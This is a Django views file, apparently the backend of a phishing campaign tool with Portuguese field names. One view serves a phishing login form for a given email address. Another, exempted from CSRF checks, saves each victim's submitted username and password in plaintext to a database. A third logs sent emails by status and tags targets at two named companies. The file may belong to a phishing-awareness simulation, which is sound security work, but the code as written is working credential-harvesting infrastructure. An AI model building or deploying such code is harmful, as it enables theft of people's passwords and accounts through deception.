from django.http import JsonResponse
from django.shortcuts import render
from django.views import View
from datetime import datetime, timedelta

from django.views.decorators.csrf import csrf_exempt

from apps.phishing_app import models


class Phishing(View):
    def get(self, request):
        email = request.GET['email']
        context = {'email': email}
        return render(request, 'phishing_app/form_phishing.html', context)

    @csrf_exempt
    def post(self, request):
        usuario = request.POST['usuario']
        senha = request.POST['senha']
        email = request.POST['email']
        data = datetime.now()

        objeto = models.Phishing(
            usuario=usuario,
            senha=senha,
            data_envio=data,
            email=email
        )

        objeto.save()
        context = {'email': email}

        return render(request, 'phishing_app/frm_resp_phishing.html', context)

class Phishing_Enviados(View):

    @csrf_exempt
    def get(self, request):
        usuario = request.GET['email'].split('@')[0]
        email = request.GET['email']
        status = request.GET['status']
        data_envio = datetime.now()

        desc_empresa = ''
        if 'conlog' in email:
            desc_empresa = 'conlog'
        elif 'deep' in email:
            desc_empresa = 'deep'

        objeto = models.Phishing_Enviados(
            usuario=usuario,
            data_envio=data_envio,
            status=status,
            desc_empresa=desc_empresa
        )
        objeto.save()

        return JsonResponse('Ok', safe=False)